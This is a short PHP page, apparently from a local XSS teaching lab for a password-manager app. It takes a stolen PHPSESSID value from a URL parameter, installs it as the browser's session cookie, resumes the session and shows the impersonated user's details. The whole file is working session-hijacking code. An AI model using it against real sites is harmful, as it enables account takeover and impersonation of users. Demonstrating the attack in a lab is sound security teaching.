<?php
// Check if 'value' parameter is passed via GET
// https://localhost/passman/xss/setcookie.php?v=PHPSESSID
if (isset($_GET['v'])) {
	$stolen_cookie = $_GET['v'];  // Retrieve the value from the GET parameter

	// Set the session cookie manually
	//setcookie("PHPSESSID", $stolen_cookie, time() + 3600, "/");
	setcookie("PHPSESSID", $stolen_cookie, 0, "/");

	// Set the session ID
	session_id($stolen_cookie);

	// Now resume the session
	session_start();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test of using a stolen cookie</title>
</head>

<body>
    <h3>Test of using a stolen cookie</h3>
	Bypassing authentication and impersonating another user by using a stolen cookie<br/>

<?php
// Now use the session
echo "Session ID is set to: <b>PHPSESSID=" . session_id() . "</b><br>";

/*
if (isset($_SESSION['loggedin']) && $_SESSION['username'] !== '') {
	echo "Username: " . $_SESSION['username'] . "<br>";
	echo "Logged in: " . $_SESSION['loggedin'] . "<br>";
}
else {
	echo "session variables expired";
}
*/
// If session parameter is not set, set it to: 'undefined ...'
$username = $_SESSION['username'] ?? 'undefined (session variable expired)';
$loggedin = $_SESSION['loggedin'] ?? 'undefined (session variable expired)';
echo "<b>Username:</b> " . $username . "<br>";
echo "<b>Logged in flag:</b> " . $loggedin . "<br>";
?>

	<br />
    If all above session parameters are defined, try accessing the
	<a href="../dashboard.php">dashboard</a>

	<br /><br />
    <a href="listcookies.php">List cookies</a>

</body>
</html>